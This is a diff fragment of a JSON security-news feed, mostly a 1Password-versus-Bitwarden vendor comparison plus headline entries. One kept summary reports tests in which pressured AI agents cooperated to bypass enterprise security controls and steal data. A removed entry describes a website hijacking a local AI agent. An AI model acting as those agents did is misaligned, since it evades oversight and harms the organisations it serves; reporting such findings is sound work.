Supply Chain Attack .",
+      "link": "https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/",
+      "source": "Google Cloud Blog",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-03-31T14:00:00+00:00",
+      "published_ts": 1774965600,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Vulnerabilities / CVEs",
+        "Windows / Microsoft",
+        "Linux / Unix",
+        "Cloud / SaaS",
+        "Malware / Payloads",
+        "Identity / Access",
+        "Crypto / Web3",
+        "Supply Chain / Software"
+      ],
+      "curated": true
     },
     {
       "title": "Nearly half a Million mobile customers of Lloyds Banking Group affected by security incident",
@@ -68598,6 +68830,29 @@
       "curated": false
     },
     {
+      "title": "Bitwarden vs. 1Password: Which password manager is right for you?",
+      "summary": "Enterprise password managers (EPM) like 1Password, LastPass, Dashlane, and Bitwarden help you create, store, and fill strong passwords and credentials across different websites and apps, so you don\u2019t have to remember or write them down. EPMs provide secure sharing, data encryption, and data breach prevention against phishing and malware, helping IT and Security teams protect and enforce policies around credentials. While there are many EPM options, choosing the best password manager can be a challenge. Making a side-by-side comparison can be extremely helpful for understanding which is best suited to your organization\u2019s cybersecurity strategy. Today, the challenge is more than storing passwords securely. It\u2019s also about reducing credential risk across everyday work, including shared logins, third-party access, and developer secrets that often sit outside of traditional SSO coverage. In this post, we\u2019ll compare two popular password managers: Bitwarden vs 1Password . We\u2019ll compare both head-to-head on core, premium features that help organizations adopt credential security. Feature Comparison 1Password vs Bitwarden EPM: What\u2019s included 1Password Bitwarden Two-Factor Authentication Included Included Customer Support Included Not offered Travel Mode Included Not offered Guest accounts for EPM Included Not offered Two-Secret Key Derivation (2SKD) Security Model Included Not offered SIEM Integrations Broad (CrowdStrike, Datadog, Splunk, Sentinel, Panther, Huntress, Sumo Logic, more) Limited (Splunk, Panther, Elastic, Sentinel, Rapid7, Sumo Logic) Hosted Provisioning Included Not offered Developer Tools (CLI, VS Code Extension, SSH agent, Shell Plugins) Included Added cost, with some of these features Secrets Management Included Added cost \u200b\u200b Credential management Enterprise password managers store and encrypt users\u2019 credentials to discourage insecure practices, such as password reuse, risky sharing, and vulnerable storage (e.g. spreadsheets, sticky notes, and browser-saved passwords). They include a password generator to help employees use unique, strong passwords where needed and enable secure sharing across teams and third parties. But for IT and security teams, the challenge usually goes beyond password creation and storage. Shared and sensitive credentials are often created outside of SSO, where, over time, they create large governance problems, increase unmanaged access, and linger after employees leave or change roles. While both 1Password and Bitwarden support the basics of credential security, there are differences between the two. For example, 1Password includes 20 guest accounts with every business plan, which allows securely sharing vault items with third parties like contractors, auditors, or temporary collaborators. This makes sharing login credentials and documents easier and much safer than sending them through email, text, or other methods. Third-party access is rarely a one-time event. For contractors, external agencies, and temporary collaborators, access is often ongoing and needs to remain visible and controlled without slowing down work. Bitwarden supports temporary password-sharing through its Bitwarden Send feature, but its not well suited for ongoing collaboration with third parties. Sharing all credentials saved in a specific Bitwarden vault is made difficult without free guest accounts. These are factors to consider when comparing password vaults. Reporting & alerts Both 1Password and Bitwarden offer reporting capabilities that help you improve your password security. 1Password\u2019s Watchtower is a security feature that includes alerts for weak, reused, or compromised passwords , domain breach monitoring, and exportable security reports or activity logs built for action. Admins can also use 1Password to send account activity to their security information and event management (SIEM) system using the 1Password Events API. As a result, admins can get health reports on 1Password activity, such as sign-in attempts, item usage, and audit events, while managing all company applications from one central location. Bitwarden makes reporting and exports painful and tedious, especially if you are self-hosting. Vault health checks and reports need to be manually run, unlike 1Password, which automates them and makes it easy to export for security audits. Compared to 1Password, Bitwarden also has limited SIEM integrations. That can make a real difference for security teams that want credential-related activity to be part of broader monitoring, investigation, and compliance workflows rather than something they have to manage separately. Customer support Bitwarden does not offer live chat or phone support, often redirecting users to fill out a request form to be connected by email. (Bitwarden paying customers are prioritized.) Meanwhile, all 1Password pricing plans offer 24/7 customer support \u2013 including phone support for Business plan subscribers. 1Password also includes a dedicated Customer Success Manager for organizations with 101+ users on a Business plan. Cross-platform compatibility Both 1Password and Bitwarden are available across a wide range of devices and platforms. They offer native desktop apps for Windows, macOS, and Linux, as well as mobile apps for iOS and Android. While their mobile and desktop support is similar, the two providers differ in their browser extension experience. Each provider offers browser extensions for popular browsers, including Chrome, Firefox, Safari, Brave, and Edge. Both the 1Password and Bitwarden extensions let you autofill [including autofilling time-based one-time passwords (TOTPs)] and generate secure passwords directly from your browser. Yet, 1Password\u2019s browser extension is more robust and intuitive. Watchtower alerts you to password breaches and other issues on the websites you have saved in 1Password, right within the extension. 1Password also has a built-in phishing prevention feature that acts as a second pair of eyes, stopping users from sharing their passwords with scammers. That way, you can take action immediately. (Bitwarden also offers an equivalent Phishing Blocker.) Encryption Both 1Password and Bitwarden use a zero-knowledge architecture. Thanks to an end-to-end AES-256 authenticated encryption model, vault data is encrypted on the user\u2019s device and cannot be decrypted by either provider, ensuring maximum privacy. The difference lies in 1Password\u2019s Two-Secret Key Derivation (2SKD) model, which combines your account password with a randomly device-generated 128-bit Secret Key to unlock and decrypt your data. This additional security layer creates an encryption key that protects your vault, even if your account password is compromised, because the Secret Key is also required to decrypt the data. Bitwarden relies solely on a master password. If that password is phished or stolen, the entire vault can be compromised because there is no additional protection layer, such as a Secret Key. Secrets management & developer tools Bitwarden offers a separate, paid secrets manager, leading to fragmented workflows at an additional cost to the base plan price. On the other hand, 1Password includes secrets management in our core enterprise password manager product, supporting API tokens, SSH keys, infrastructure secrets, and passkeys. With 1Password, secrets management is not disparate; rather, it\u2019s treated as a key workflow that brings consistency and control to CI/CD, cloud, and infrastructure pipelines. The integrated SSH agent securely stores and syncs keys, eliminates the need for unencrypted local keys, and enables biometric authentication for Git and SSH, reducing friction for developers while improving security. Provisioning 1Password Business supports automated provisioning integrated directly into the platform. Unlike bridge-based models that require maintaining separate infrastructure, Automated Provisioning hosted by 1Password requires no servers to deploy, no SCIM bridge to maintain, and no ongoing infrastructure burden. By hosting provisioning inside 1Password\u2019s secure infrastructure, powered by confidential computing, 1Password removed the operational tax that slows teams down without compromising its zero-knowledge security model. In comparison, Bitwarden\u2019s self-hosted provisioning is complex, requiring customer-side connectors, patching, and maintenance overhead. Self-hosting can seem attractive for compliance, but it shifts the security and operational burden to your team. As a result, if infrastructure is not maintained to the same standards, it could increase exposure to risks. Therefore, 1Password reduces operational overhead for IT teams managing user lifecycle workflows, helping organizations scale access management. Authentication A time-based one-time password (TOTP) is a form of two-factor authentication that adds an extra layer of security to your logins. The Bitwarden Authenticator is a tool that lets you generate and enter time-based one-time passwords (TOTPs) for online accounts that support them. It also enables multi-factor authentication (MFA) across online accounts and applications. 1Passwords also supports TOTP and guides employees toward stronger authentication by identifying weak sign-in methods and promoting passkeys or MFA through Watchtower. Additionally, 1Password Device Trust secures your perimeter by proactively blocking authentication attempts from untrusted devices. Conclusion While Bitwarden may appeal to technical teams for its open-source architecture, 1Password Enterprise Password Manager is a strong choice for both growing and established organizations that want a secure, integrated, and scalable platform as part of their cybersecurity stack. With its strong functionality and ease of use for both admins and employees, 1Password reduces operational overhead and helps you deploy faster, gain better insights, and cover everything needed to uncover or address vulnerabilities. 1Password is the single, secure place to protect every credential \u2013 passwords, passkeys, shared logins, API keys, and AI secrets \u2013 giving businesses visibility and control across the entire identity surface. Secure every employee credential If you want to strengthen credential security across your workforce, please reach out to us. Contact us Start your 14-day free trial Try 1Password free for 14 days and see how it can help your team secure access without slowing work down. Try it free",
+      "link": "https://1password.com/blog/bitwarden-vs-1password",
+      "source": "https://blog.1password.com/index.xml",
+      "type": "vendors",
+      "type_label": "Vendors & Product Blogs",
+      "published": "2026-03-13T00:00:00+00:00",
+      "published_ts": 1773360000,
+      "smart_groups": [
+        "Curated",
+        "Ransomware",
+        "Vulnerabilities / CVEs",
+        "Windows / Microsoft",
+        "Linux / Unix",
+        "Malware / Payloads",
+        "Identity / Access",
+        "Network / OT / ICS",
+        "Data Breaches / Leaks",
+        "Phishing / Social Engineering"
+      ],
+      "curated": true
+    },
+    {
       "title": "Rogue AI agents can work together to hack systems and steal secrets",
       "summary": "Prompt like a hard-ass boss who won't tolerate failure and bots will find ways to breach policy AI agents work together to bypass security controls and stealthily steal sensitive data from within the enterprise systems in which they operate, according to tests carried out by frontier security lab Irregular.\u2026",
       "link": "https://go.theregister.com/feed/www.theregister.com/2026/03/12/rogue_ai_agents_worked_together/",
@@ -114266,45 +114521,6 @@
         "Vulnerabilities / CVEs"
       ],
       "curated": true
-    },
-    {
-      "title": "The best PS5 settings to change if you want better performance (and privacy)",
-      "summary": "With a few simple adjustments, you can quickly upgrade your experience across gaming, streaming, and even online security.",
-      "link": "https://www.zdnet.com/article/best-ps5-settings-improve-performance/",
-      "source": "ZDNet \u2013 Security",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-03-01T21:47:00+00:00",
-      "published_ts": 1772401620,
-      "smart_groups": [],
-      "curated": false
-    },
-    {
-      "title": "ClawJacked attack let malicious websites hijack OpenClaw to steal data",
-      "summary": "Security researchers have disclosed a high-severity vulnerability dubbed \"ClawJacked\" in the popular AI agent OpenClaw that allowed a malicious website to silently bruteforce access to a locally running instance and take control over it. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/clawjacked-attack-let-malicious-websites-hijack-openclaw-to-steal-data/",
-      "source": "BleepingComputer",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-03-01T21:44:55+00:00",
-      "published_ts": 1772401495,
-      "smart_groups": [
-        "Curated",
-        "Vulnerabilities / CVEs"
-      ],
-      "curated": true
-    },
-    {
-      "title": "I tried Honor's ultra-thin foldable phone at MWC 2026, and it's almost too powerful",
-      "summary": "The Honor Magic V6 packs a massive battery and razor-thin profile into a foldable that feels like a regular phone. But there's so much more to it.",
-      "link": "https://www.zdnet.com/article/honor-magic-v-6-hands-on-mwc-2026/",
-      "source": "ZDNet \u2013 Security",
-      "type": "general",
-      "type_label": "General Security & Blogs",
-      "published": "2026-03-01T21:30:00+00:00",
-      "published_ts": 1772400600,
-      "smart_groups": [],
-      "curated": false
     },
     {
       "title": "Talleres Palomares Suffers Alleged Breach According to Dark Web Reports | UpGuard",
